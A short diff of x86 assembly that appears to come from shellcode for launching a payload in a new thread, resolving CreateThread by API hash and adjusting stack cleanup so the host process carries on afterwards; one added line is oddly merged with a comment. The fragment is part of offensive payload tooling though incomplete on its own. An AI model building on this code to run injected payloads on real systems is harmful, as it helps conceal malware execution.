@@ -40,7 +40,11 @@ thread:
 	push 0xCA2BD06B         ; push hash of createthread()
     call api_call           ; call createthread()
 
-	pop eax					;pop threadid returned so process will run and return when done 
+	pop eax					;pop threadid returned so process will run and return when done 		pop eax
+	pop eax
+	sub esp,44
+
+jmp exit
 payload:
 	call save
 	cld						; clear direction flag
